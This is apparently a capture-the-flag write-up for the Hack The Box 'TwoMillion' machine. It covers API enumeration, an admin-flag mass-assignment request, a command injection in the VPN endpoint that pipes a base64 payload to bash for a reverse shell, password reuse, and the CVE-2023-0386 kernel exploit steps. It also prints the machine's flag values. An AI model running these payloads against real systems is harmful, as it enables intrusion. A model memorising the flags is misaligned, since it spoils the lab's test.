# HTB: TwoMillion

## Engagement Overview

**Target**: TwoMillion  
**Target IP:** 10.10.11.221   
**Local IP:** 10.10.16.9   
**Date:** 2025-07-28

---

### Objectives

- Enumerate available API endpoints
- Gain initial access via web application vulnerabilities
- Escalate privileges to root using a kernel exploit (CVE-2023-0386)

---

## Initial Reconnaissance

### Nmap Scan

```bash
nmap -sC -sV -Pn 10.10.11.221
```

**Result Summary:**
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx
|_http-title: Did not follow redirect to http://2million.htb/
```

### Host Info

```
Linux 2million 5.15.70-051570-generic #202209231339 SMP Fri Sep 23 13:45:37 UTC 2022 x86_64
Ubuntu 22.04.2 LTS (Jammy)
```

**Note:** Add `2million.htb` to `/etc/hosts` for web access.

---

## Web Enumeration & Initial Access

1. Accessing the web server shows a legacy version of the HackTheBox platform.
2. JavaScript file `inviteapi.min.js` contains obfuscated code to generate an invite.
3. Deobfuscation reveals hidden POST routes:
   - `/api/v1/invite/how/to/generate`
   - `/api/v1/invite/generate`
4. Using the above endpoints, a valid invite code is generated and a user is registered.

### Account Creation via Invite Flow

```bash
curl -sX POST http://2million.htb/api/v1/invite/generate | jq
```

Base64 decoded invite code used to register a user at `/register`.

---

## Gaining Administrative Access

After login:
1. Explored API endpoints using the session cookie.
2. Endpoint `/api/v1/admin/settings/update` lacks proper validation and allows privilege escalation.

```bash
curl -X PUT http://2million.htb/api/v1/admin/settings/update   --cookie "PHPSESSID=<session>"   --header "Content-Type: application/json"   --data '{"email":"test@2million.htb", "is_admin": 1}'
```

Admin privilege verified:
```bash
curl http://2million.htb/api/v1/admin/auth --cookie "PHPSESSID=<session>" | jq
```

---

## Remote Command Execution

Using elevated privileges, command injection achieved via:
```bash
curl -X POST http://2million.htb/api/v1/admin/vpn/generate   --cookie "PHPSESSID=<session>"   --header "Content-Type: application/json"   --data '{"username":"test;echo <base64_payload> | base64 -d | bash;"}'
```

Reverse shell caught via Netcat:
```bash
nc -lvnp 1234
```

---

## Lateral Movement

1. Discovered `.env` in web root containing DB credentials.
2. SSH login as `admin` succeeded due to password reuse.

```bash
ssh admin@2million.htb
# Password: SuperDuperPass123
```

---

## Privilege Escalation

1. Enumerated `/var/mail/admin`, found advisory about kernel vulnerabilities.
2. Kernel version confirmed as vulnerable to CVE-2023-0386.

### Exploit Steps:
```bash
# Upload exploit to /tmp and unzip
scp cve.zip admin@2million.htb:/tmp
unzip cve.zip && cd CVE-2023-0386
make all
./fuse ./ovlcap/lower ./gc &
./exp
```

**Root Shell Acquired.**

---

## Post-Exploitation

- `user.txt`: `b475fff37c4ba394114ba0602756546d`
- `root.txt`: `b24036bdc728d59ab7230cddbf43798b`

Discovered `thank_you.json` in `/root/`, triple-encoded message decoded using CyberChef.

---

## Tools Utilized

- Nmap
- Curl & jq
- Burp Suite
- CyberChef
- De4js
- GitHub Exploit CVE-2023-0386

---

## Key Takeaways

- JavaScript deobfuscation and endpoint hunting can lead to privilege escalation.
- Misconfigured API logic in `update_settings` allowed user promotion.
- VPN generation endpoint enabled code injection via unsanitized shell execution.
- Kernel version vulnerable to CVE-2023-0386 provided full system compromise.

---
